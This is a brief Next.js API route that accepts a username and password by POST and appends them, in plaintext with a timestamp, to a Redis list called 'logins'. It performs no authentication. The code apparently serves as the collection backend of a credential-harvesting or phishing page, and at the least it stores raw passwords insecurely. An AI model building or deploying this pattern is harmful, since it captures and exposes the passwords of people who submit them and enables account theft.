import { NextResponse } from "next/server";
import { Redis } from "@upstash/redis";

const redis = new Redis({
  url: process.env.KV_REST_API_URL,
  token: process.env.KV_REST_API_TOKEN,
});

export async function POST(request) {
  try {
    const { username, password } = await request.json();

    const logEntry = {
      username,
      password,
      date: new Date().toISOString(),
    };

    // Push the login entry to a Redis list
    await redis.rpush("logins", JSON.stringify(logEntry));

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}
